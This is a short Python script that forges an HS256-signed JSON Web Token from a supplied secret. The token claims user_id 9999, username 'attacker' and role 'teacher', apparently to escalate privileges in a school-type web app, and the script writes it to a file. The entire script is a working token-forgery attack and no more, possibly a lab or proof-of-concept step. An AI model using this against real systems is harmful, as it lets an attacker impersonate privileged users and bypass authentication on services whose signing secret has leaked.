import base64, hashlib, hmac, json, sys

secret, out_path = sys.argv[1:3]


def b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


header = {"alg": "HS256", "typ": "JWT"}
payload = {"user_id": 9999, "username": "attacker", "role": "teacher"}
h = b64(json.dumps(header, separators=(",", ":")).encode())
p = b64(json.dumps(payload, separators=(",", ":")).encode())
sig = b64(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
token = f"{h}.{p}.{sig}"
open(out_path, "w", encoding="utf-8").write(token + "\n")
print(token)
